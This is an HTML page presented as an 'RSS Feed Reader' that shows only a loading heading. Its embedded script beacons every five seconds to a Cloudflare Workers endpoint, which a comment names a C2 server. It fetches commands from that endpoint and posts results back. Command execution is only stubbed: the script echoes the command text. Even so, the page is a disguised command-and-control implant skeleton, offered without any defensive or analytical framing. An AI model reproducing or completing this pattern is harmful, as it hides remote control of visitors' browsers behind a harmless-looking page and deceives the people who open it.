<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>RSS Feed Reader</title>
</head>
<body>
    <h1>Loading RSS Feed...</h1>
    
    <script>
        // あなたのCloudflare WorkersのURLを指定
        const workerUrl = 'https://myrss.bunkihara08.workers.dev';

        async function pollCommand() {
            try {
                // Cloudflare Workersへコマンドを要求
                let response = await fetch(`${workerUrl}/poll`);
                let data = await response.json();
                
                if (data && data.cmd) {
                    console.log("Command received:", data.cmd);
                    
                    // コマンドの実行結果
                    let output = "Result of: " + data.cmd;

                    // 実行結果をWorkersへ送信
                    await fetch(`${workerUrl}/result`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ result: output })
                    });
                }
            } catch (error) {
                console.error("Communication error", error);
            }
        }

        // 5秒ごとにC2サーバーへポーリングを行う
        setInterval(pollCommand, 5000);
    </script>
</body>
</html>
